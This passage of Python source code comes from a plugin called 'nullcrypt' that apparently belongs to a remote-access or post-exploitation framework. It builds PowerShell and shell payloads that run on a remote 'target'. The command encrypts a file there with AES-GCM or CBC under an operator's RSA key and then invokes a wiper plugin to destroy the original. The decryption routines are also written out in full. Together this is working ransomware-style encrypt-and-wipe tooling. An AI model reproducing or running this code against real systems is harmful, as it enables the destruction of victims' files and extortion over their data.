                        pt = gcm.decrypt(nonce, ct + tag, None)
                        out.write(pt)
                        total_written += len(pt)
                    if total_written != original_size:
                        raise RuntimeError(f'Decrypted size mismatch: {total_written} vs {original_size}')
            except ImportError:
                raise RuntimeError('AES-GCM decryption requires python-cryptography (or manual OpenSSL)')
        elif sym == 'AES-256-CBC+HMAC-SHA256':
            stored_tag = base64.b64decode(header.get('tag', ''))
            if len(stored_tag) != 32:
                raise RuntimeError('Invalid HMAC tag length')
            cipher = fh.read()
            computed_tag = hmac.new(aes_key, iv + cipher, hashlib.sha256).digest()
            if not hmac.compare_digest(computed_tag, stored_tag):
                raise RuntimeError('HMAC mismatch')
            with tempfile.NamedTemporaryFile('wb', delete=False) as cipher_f:
                cipher_f.write(cipher)
                cipher_path = cipher_f.name
            with tempfile.NamedTemporaryFile('wb', delete=False) as dec_f:
                dec_path = dec_f.name
            try:
                iv_hex = iv.hex()
                key_hex = aes_key.hex()
                proc = subprocess.run(
                    ['openssl', 'enc', '-d', '-aes-256-cbc', '-K', key_hex, '-iv', iv_hex,
                     '-in', cipher_path, '-out', dec_path],
                    capture_output=True,
                    timeout=max(120, original_size // (1024*1024) * 15 + 60),
                )
                if proc.returncode != 0:
                    raise RuntimeError('openssl decrypt failed: ' + proc.stderr.decode('utf-8', 'ignore'))
                if os.path.getsize(dec_path) != original_size:
                    raise RuntimeError('Decrypted size mismatch')
                shutil.move(dec_path, out_path)
                dec_path = ''
            finally:
                for p in (cipher_path, dec_path):
                    if p and os.path.lexists(p):
                        try:
                            os.remove(p)
                        except OSError:
                            pass
        else:
            raise RuntimeError('Unsupported sym')

    _emit({{
        "path": path,
        "output": out_path,
        "size": original_size,
        "algorithm": sym + ' + RSA-OAEP-SHA256',
        "verified": True,
        "platform": platform.system(),
        "message": "File decrypted successfully",
    }})
except Exception as e:
    _emit({{"error": str(e), "path": path, "output": out_path, "platform": "linux"}})
'''
    return build_linux_collector_command(source)


def _build_windows_decrypt(remote_path: str, out_path: str, privkey_pem: str) -> str:
    escaped_path = remote_path.replace("'", "''")
    escaped_out = out_path.replace("'", "''")
    priv_esc = privkey_pem.replace('"', '`"').replace("'", "''")
    return rf"""
$ErrorActionPreference='Stop'
$start='{PLUGIN_MARK_START}'; $end='{PLUGIN_MARK_END}'
$path='{escaped_path}'
$outPath='{escaped_out}'
$privPem=@'
{privkey_pem}
'@

$result=@{{path=$path;platform='windows'}}
try {{
  if (-not (Test-Path -LiteralPath $path -PathType Leaf)) {{
    throw 'File not found'
  }}

  # --- Check OpenSSL availability ---
  $openssl = (Get-Command openssl -ErrorAction SilentlyContinue).Source
  if (-not $openssl) {{
    throw 'OpenSSL not found in PATH. Decryption on this host requires OpenSSL. You can also decrypt the file manually using OpenSSL on any compatible system.'
  }}

  # Read encrypted file
  $fs = [IO.File]::OpenRead($path)
  try {{
    # Read length prefix
    $lenBuf = New-Object byte[] 4
    if ($fs.Read($lenBuf,0,4) -ne 4) {{ throw 'Truncated file' }}
    if ([BitConverter]::IsLittleEndian) {{ [Array]::Reverse($lenBuf) }}
    $hdrLen = [BitConverter]::ToUInt32($lenBuf,0)
    $hdrBuf = New-Object byte[] $hdrLen
    if ($fs.Read($hdrBuf,0,$hdrLen) -ne $hdrLen) {{ throw 'Truncated header' }}
    $hdrJson = [Text.Encoding]::UTF8.GetString($hdrBuf)
    $header = $hdrJson | ConvertFrom-Json
    if ($header.magic -ne 'TRC2NULLCRYPT') {{ throw 'Invalid magic' }}
    $sym = $header.sym
    if ($sym -notin @('AES-256-GCM','AES-256-CBC+HMAC-SHA256')) {{ throw "Unsupported sym: $sym" }}
    $ver = $header.version
    $wrappedKeyB64 = $header.wrapped_key
    $iv = [Convert]::FromBase64String($header.iv)

    # Write private key to temp file
    $tmpDir = [IO.Path]::GetTempPath() + '.tornado_nullcrypt_decrypt_' + [System.Guid]::NewGuid().ToString().Substring(0,8)
    New-Item -ItemType Directory -Path $tmpDir -Force | Out-Null
    $keyPath = Join-Path $tmpDir 'priv.pem'
    [IO.File]::WriteAllText($keyPath, $privPem)

    # Use OpenSSL to unwrap AES key
    $wrappedKey = [Convert]::FromBase64String($wrappedKeyB64)
    $wrapInput = [IO.Path]::GetTempFileName()
    [IO.File]::WriteAllBytes($wrapInput, $wrappedKey)
    $unwrapOut = [IO.Path]::GetTempFileName()
    try {{
      $proc = Start-Process -FilePath $openssl -ArgumentList @(
        'pkeyutl', '-decrypt',
        '-inkey', $keyPath,
        '-pkeyopt', 'rsa_padding_mode:oaep',
        '-pkeyopt', 'rsa_oaep_md:sha256',
        '-in', $wrapInput,
        '-out', $unwrapOut
      ) -Wait -NoNewWindow -PassThru
      if ($proc.ExitCode -ne 0) {{
        throw "OpenSSL decryption failed (exit $($proc.ExitCode))"
      }}
      $aesKey = [IO.File]::ReadAllBytes($unwrapOut)
      if ($aesKey.Length -ne 32) {{ throw "Decrypted AES key length is $($aesKey.Length) (expected 32)" }}
    }} finally {{
      if (Test-Path $wrapInput) {{ Remove-Item $wrapInput -Force }}
      if (Test-Path $unwrapOut) {{ Remove-Item $unwrapOut -Force }}
    }}

    # Verify meta_mac if present (version >=2)
    if ($ver -ge 2 -and $header.meta_mac) {{
      $storedMac = [Convert]::FromBase64String($header.meta_mac)
      $canonical = $header | ConvertTo-Json -Compress -Depth 10
      $hmac = New-Object System.Security.Cryptography.HMACSHA256(,$aesKey)
      $computedMac = $hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($canonical))
      if (-not [System.Linq.Enumerable]::SequenceEqual($computedMac,$storedMac)) {{
        throw 'Metadata MAC mismatch'
      }}
    }}

    $originalSize = $header.size
    $chunkCount = if ($header.chunk_count) {{$header.chunk_count}} else {{1}}
    $chunkSize = if ($header.chunk_size) {{$header.chunk_size}} else {{1048576}}

    if ($sym -eq 'AES-256-GCM') {{
      $aesgcmType = [Type]::GetType('System.Security.Cryptography.AesGcm')
      if (-not $aesgcmType) {{ throw 'AesGcm not available on this system' }}
      $gcm = [System.Security.Cryptography.AesGcm]::new($aesKey)
      try {{
        $outFs = [IO.File]::Create($outPath)
        try {{
          $totalWritten = 0
          for ($idx=0; $idx -lt $chunkCount; $idx++) {{
            $remaining = $originalSize - $totalWritten
            if ($remaining -le 0) {{ break }}
            $readSize = if ($remaining -gt $chunkSize) {{$chunkSize}} else {{$remaining}}
            $cipher = New-Object byte[] $readSize
            $tag = New-Object byte[] 16
            $bytesRead = $fs.Read($cipher,0,$readSize)
            if ($bytesRead -ne $readSize) {{ throw "Truncated chunk $idx" }}
            $tagBytes = $fs.Read($tag,0,16)
            if ($tagBytes -ne 16) {{ throw "Truncated tag $idx" }}
            $nonce = $iv[0..3] + [BitConverter]::GetBytes($idx)[0..7]
            $plain = New-Object byte[] $readSize
            $gcm.Decrypt($nonce, $cipher, $tag, $plain)
            $outFs.Write($plain,0,$plain.Length)
            $totalWritten += $plain.Length
          }}
          if ($totalWritten -ne $originalSize) {{
            throw "Decrypted size mismatch: $totalWritten vs $originalSize"
          }}
        }} finally {{
          $outFs.Close()
        }}
      }} finally {{
        $gcm.Dispose()
      }}
    }} elseif ($sym -eq 'AES-256-CBC+HMAC-SHA256') {{
      $storedTag = [Convert]::FromBase64String($header.tag)
      if ($storedTag.Length -ne 32) {{ throw 'Invalid tag length' }}
      $cipher = New-Object byte[] ($fs.Length - $fs.Position)
      $fs.Read($cipher,0,$cipher.Length) | Out-Null
      $hmac = New-Object System.Security.Cryptography.HMACSHA256(,$aesKey)
      $computedTag = $hmac.ComputeHash($iv + $cipher)
      if (-not [System.Linq.Enumerable]::SequenceEqual($computedTag,$storedTag)) {{
        throw 'HMAC mismatch'
      }}
      $aes = [System.Security.Cryptography.Aes]::Create()
      $aes.Key = $aesKey
      $aes.IV = $iv
      $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
      $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
      $dec = $aes.CreateDecryptor()
      try {{
        $plain = $dec.TransformFinalBlock($cipher,0,$cipher.Length)
        if ($plain.Length -ne $originalSize) {{ throw "Decrypted size mismatch" }}
        [IO.File]::WriteAllBytes($outPath, $plain)
      }} finally {{
        $dec.Dispose()
        $aes.Dispose()
      }}
    }} else {{
      throw "Unsupported sym"
    }}
    $result.output=$outPath
    $result.size=$originalSize
    $result.algorithm="$sym + RSA-OAEP-SHA256"
    $result.verified=$true
    $result.message='File decrypted successfully'
  }} finally {{
    $fs.Close()
    if (Test-Path $tmpDir) {{ Remove-Item -Recurse -Force -LiteralPath $tmpDir }}
  }}
}} catch {{
  $result.error=$_.Exception.Message
}}
Write-Output ($start+(ConvertTo-Json $result -Compress)+$end)
"""


@plugin.command(
    name='nullcrypt',
    platforms=['linux', 'windows', 'unix'],
    description='Hybrid encrypt/decrypt a remote file (AES-GCM + RSA-OAEP) and wipe original (encrypt only). See: plugins info nullcrypt',
)
def run(session: SessionContext, args):
    mode, remote_path, key_ref, out_path, usage = _parse_nullcrypt_args(args)
    if usage:
        session.print(usage, 'yellow')
        return 1

    if mode == 'encrypt':
        try:
            pubkey_pem = _load_pubkey(key_ref)
            n_bytes, e_bytes = _rsa_components_from_pem(pubkey_pem)
        except (OSError, ValueError, subprocess.CalledProcessError) as exc:
            session.print(f"Plugin 'nullcrypt' error: {exc}", 'red')
            return 1

        n_b64 = base64.b64encode(n_bytes).decode('ascii')
        e_b64 = base64.b64encode(e_bytes).decode('ascii')

        session.log_event(f"Plugin nullcrypt: encrypt {remote_path} -> {out_path}")
        session.print(_NULLCRYPT_WARNING, 'yellow')
        session._handler._flush_shell(session._client_sock, timeout=1.0)

        if session.is_windows:
            win_ps = _build_windows_nullcrypt(remote_path, out_path, n_b64, e_b64)
            unix_cmd = 'true'
        else:
            unix_cmd = _build_linux_nullcrypt(remote_path, out_path, pubkey_pem)
            win_ps = ''

        raw = session.run_marked(
            unix_cmd,
            win_ps,
            timeout=max(180.0, 120.0),
            start_mark=PLUGIN_MARK_START,
            end_mark=PLUGIN_MARK_END,
            strip_ws=False,
        )

        if raw is None:
            session.print("Plugin 'nullcrypt' failed — no response from target.", 'red')
            session.log_plugin_result('nullcrypt', '', f'no response for {remote_path}')
            return 1

        data = parse_collector_json(raw)
        if not data:
            session.print("Plugin 'nullcrypt' failed — could not parse encryption results.", 'red')
            session.log_plugin_result('nullcrypt', raw[:4000], 'parse error')
            return 1

        if data.get('error'):
            session.print(f"Plugin 'nullcrypt' error: {data['error']}", 'red')
            report = format_nullcrypt_report(data, wiped=False)
            session.print(report, 'cyan')
            session.log_plugin_result('nullcrypt', report, json.dumps(data, indent=2))
            return 1

        if not data.get('verified'):
            session.print("Plugin 'nullcrypt' error: encrypted output was not verified on target.", 'red')
            report = format_nullcrypt_report(data, wiped=False)
            session.print(report, 'cyan')
            session.log_plugin_result('nullcrypt', report, json.dumps(data, indent=2))
            return 1

        report = format_nullcrypt_report(data)
        session.print(report, 'cyan')
        session.log_plugin_result('nullcrypt', report, json.dumps(data, indent=2))

        session.print('Invoking wiper on original file...', 'yellow')
        session._handler._flush_shell(session._client_sock, timeout=3.0)
        wipe_rc, wipe_data = wiper_plugin.run(
            session,
            [remote_path, 'method=standard'],
            quiet=True,
            return_result=True,
        )
        data['wiped'] = wipe_rc == 0
        if wipe_data:
            data['wipe_detail'] = wipe_data.get('message') or wipe_data.get('error') or ''
            data['wipe_steps'] = wipe_data.get('steps') or []
        final_report = format_nullcrypt_report(data, wiped=data['wiped'])
        session.print(final_report, 'cyan')
        session.log_command(f'run nullcrypt encrypt {remote_path}', final_report)

        if wipe_rc != 0:
            detail = (wipe_data or {}).get('error') or 'unknown wiper failure'
            if (wipe_data or {}).get('fallback_error'):
                detail += f" (fallback: {wipe_data['fallback_error']})"
            session.print(
                f"Encryption succeeded but wiper failed — encrypted file exists; original may remain.\n"
                f"Wiper detail: {detail}",
                'red',
            )
            return 1
        return 0

    else:
        try:
            privkey_pem = _load_privkey(key_ref)
        except (OSError, ValueError) as exc:
            session.print(f"Plugin 'nullcrypt' error: {exc}", 'red')
            return 1

        import sys, time

        session.print("\n" + "=" * 70, 'yellow')
        if hasattr(session._handler, '_flush_shell'):
            session._handler._flush_shell(session._client_sock, timeout=0.1)

        session.print("⚠️  WARNING: You are about to send your PRIVATE KEY to the remote host.", 'red')
        if hasattr(session._handler, '_flush_shell'):
            session._handler._flush_shell(session._client_sock, timeout=0.1)

        session.print("   This is only safe over an authenticated encrypted channel (e.g., SSH, or TLS).", 'yellow')
        if hasattr(session._handler, '_flush_shell'):
            session._handler._flush_shell(session._client_sock, timeout=0.1)

        session.print("   If you are using an unencrypted or untrusted channel, this is extremely risky.", 'red')
        if hasattr(session._handler, '_flush_shell'):
            session._handler._flush_shell(session._client_sock, timeout=0.1)

        session.print("   You may prefer to decrypt the file offline on your own machine using OpenSSL.", 'yellow')
        if hasattr(session._handler, '_flush_shell'):
            session._handler._flush_shell(session._client_sock, timeout=0.1)

        session.print("=" * 70, 'yellow')
        if hasattr(session._handler, '_flush_shell'):
            session._handler._flush_shell(session._client_sock, timeout=0.1)

        session.print(f"Remote file: {remote_path}")
        session.print(f"Output file: {out_path}")
        session.print(f"Private key: {key_ref}")
        session.print("")
        if hasattr(session._handler, '_flush_shell'):
            session._handler._flush_shell(session._client_sock, timeout=0.1)

        sys.stdout.flush()
        sys.stderr.flush()

        time.sleep(0.5)

        session.log_event(f"Plugin nullcrypt: decrypt {remote_path} -> {out_path}")

        if session.is_windows:
            win_ps = _build_windows_decrypt(remote_path, out_path, privkey_pem)
            unix_cmd = 'true'
        else:
            unix_cmd = _build_linux_decrypt(remote_path, out_path, privkey_pem)
            win_ps = ''

        raw = session.run_marked(
            unix_cmd,
            win_ps,
            timeout=max(180.0, 120.0),
            start_mark=PLUGIN_MARK_START,
            end_mark=PLUGIN_MARK_END,
            strip_ws=False,
        )

        if raw is None:
            session.print("Plugin 'nullcrypt' failed — no response from target.", 'red')
            session.log_plugin_result('nullcrypt', '', f'no response for {remote_path}')
            return 1

        data = parse_collector_json(raw)
        if not data:
            session.print("Plugin 'nullcrypt' failed — could not parse decryption results.", 'red')
            session.log_plugin_result('nullcrypt', raw[:4000], 'parse error')
            return 1

        if data.get('error'):
            session.print(f"Plugin 'nullcrypt' error: {data['error']}", 'red')
            report = format_nullcrypt_report(data, wiped=False)
            session.print(report, 'cyan')
            session.log_plugin_result('nullcrypt', report, json.dumps(data, indent=2))
            return 1

        if not data.get('verified'):
            session.print("Plugin 'nullcrypt' error: decryption was not verified.", 'red')
            report = format_nullcrypt_report(data, wiped=False)
            session.print(report, 'cyan')
            session.log_plugin_result('nullcrypt', report, json.dumps(data, indent=2))
            return 1

        report = format_nullcrypt_report(data, wiped=False)
        session.print(report, 'cyan')
        session.log_plugin_result('nullcrypt', report, json.dumps(data, indent=2))
        session.log_command(f'run nullcrypt decrypt {remote_path}', report)
        return 0